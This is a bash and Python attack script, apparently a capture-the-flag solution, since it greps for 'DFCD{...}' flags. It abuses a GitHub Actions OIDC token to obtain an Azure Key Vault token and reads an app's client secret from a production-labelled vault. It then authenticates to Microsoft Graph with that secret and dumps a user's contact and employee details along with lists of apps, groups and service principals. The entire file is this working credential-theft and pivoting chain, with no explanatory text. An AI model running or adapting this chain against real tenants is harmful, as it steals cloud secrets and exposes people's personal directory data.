#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
PROD="https://kv-tbl-prod-x3euoz.vault.azure.net/secrets"
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
js=$(curl -sS "$PROD/directory-audit-principal?api-version=7.4" -H "Authorization: Bearer $VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
cid=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("appId") or "")')
sc=$(printf '%s' "$js" | python3 -c 'import sys,json;d=json.loads(sys.stdin.read());print(d.get("clientSecret") or "")')
export G=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$cid" -d grant_type=client_credentials --data-urlencode "client_secret=$sc" --data-urlencode "scope=https://graph.microsoft.com/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
python3 - <<'PYEOF'
import json,urllib.request,urllib.error,os,re
G=os.environ["G"]
def get(u):
    try: return urllib.request.urlopen(urllib.request.Request(u,headers={"Authorization":"Bearer "+G,"ConsistencyLevel":"eventual"})).read().decode()
    except urllib.error.HTTPError as e: return "ERR%d %s"%(e.code,e.read().decode()[:150])
T={
"user":"https://graph.microsoft.com/v1.0/users/d2cdf247-9319-40cb-8324-5a005ef538da?$select=displayName,userPrincipalName,jobTitle,department,mail,mobilePhone,officeLocation,employeeId,onPremisesExtensionAttributes",
"apps":"https://graph.microsoft.com/v1.0/applications?$select=displayName,notes,tags,identifierUris,description&$top=60",
"groups":"https://graph.microsoft.com/v1.0/groups?$select=displayName,description,mail&$top=60",
"sps":"https://graph.microsoft.com/v1.0/servicePrincipals?$select=displayName,notes,tags,description&$top=100",
}
for n,u in T.items():
    r=get(u); print("==",n,"=="); print(r[:2500])
    m=re.findall(r"DFCD\{[^}]*\}",r)
    if m: print("  !!!FLAG:",m)
PYEOF
echo END
